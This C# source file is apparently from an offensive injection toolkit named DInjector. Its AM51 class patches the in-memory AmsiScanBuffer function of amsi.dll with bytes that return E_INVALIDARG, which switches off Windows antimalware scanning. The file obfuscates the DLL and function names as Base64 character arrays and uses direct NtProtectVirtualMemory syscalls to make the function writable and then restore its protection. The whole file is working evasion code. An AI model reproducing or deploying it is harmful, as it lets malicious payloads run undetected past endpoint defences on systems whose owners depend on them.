using System;
using System.Text;
using System.Runtime.InteropServices;

using DI = DInvoke;
using static DInvoke.Data.Native;

namespace DInjector
{
    class AM51
    {
        // mov    eax,0x80070057 (E_INVALIDARG); ret
        private static readonly byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        //private static readonly byte[] x86 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };

        // xor rax, rax
        //private static readonly byte[] x64 = new byte[] { 0x48, 0x31, 0xC0 };

        public static void Patch()
        {
            ChangeBytes(x64);
        }

        private static void ChangeBytes(byte[] patch)
        {
            try
            {
                #region GetLibraryAddress

                // "amsi.dll"
                var libNameB64 = new char[] { 'Y', 'W', '1', 'z', 'a', 'S', '5', 'k', 'b', 'G', 'w', '=' };
                var libName = Encoding.UTF8.GetString(Convert.FromBase64String(string.Join("", libNameB64)));

                // "AmsiScanBuffer"
                var funcNameB64 = new char[] { 'Q', 'W', '1', 'z', 'a', 'V', 'N', 'j', 'Y', 'W', '5', 'C', 'd', 'W', 'Z', 'm', 'Z', 'X', 'I', '=' };
                var funcName = Encoding.UTF8.GetString(Convert.FromBase64String(string.Join("", funcNameB64)));

                IntPtr pFunction = DI.DynamicInvoke.Generic.GetLibraryAddress(libName, funcName, CanLoadFromDisk: false, ResolveForwards: true);

                #endregion

                #region NtProtectVirtualMemory (PAGE_READWRITE)

                IntPtr hProcess = IntPtr.Zero; // Process.GetCurrentProcess().Handle
                IntPtr protectAddress = pFunction;
                var regionSize = (IntPtr)patch.Length;
                uint oldProtect = 0;

                var ntstatus = Syscalls.NtProtectVirtualMemory(
                    hProcess,
                    ref protectAddress,
                    ref regionSize,
                    DI.Data.Win32.WinNT.PAGE_READWRITE,
                    ref oldProtect);

                if (ntstatus == NTSTATUS.Success)
                    Console.WriteLine("(AM51) [+] NtProtectVirtualMemory, PAGE_READWRITE");
                else
                    throw new Exception($"(AM51) [-] NtProtectVirtualMemory, PAGE_READWRITE: {ntstatus}");

                Console.WriteLine("(AM51) [>] Patching at address: " + string.Format("{0:X}", pFunction.ToInt64()));
                Marshal.Copy(patch, 0, pFunction, patch.Length);

                #endregion

                #region NtProtectVirtualMemory (oldProtect)

                regionSize = (IntPtr)patch.Length;
                uint tmpProtect = 0;

                ntstatus = Syscalls.NtProtectVirtualMemory(
                    hProcess,
                    ref pFunction,
                    ref regionSize,
                    oldProtect,
                    ref tmpProtect);

                if (ntstatus == NTSTATUS.Success)
                    Console.WriteLine("(AM51) [+] NtProtectVirtualMemory, oldProtect");
                else
                    throw new Exception($"(AM51) [-] NtProtectVirtualMemory, oldProtect: {ntstatus}");

                #endregion
            }
            catch (Exception e)
            {
                Console.WriteLine($"(AM51) [x] {e.Message}");
                Console.WriteLine($"(AM51) [x] {e.InnerException}");
            }
        }
    }
}
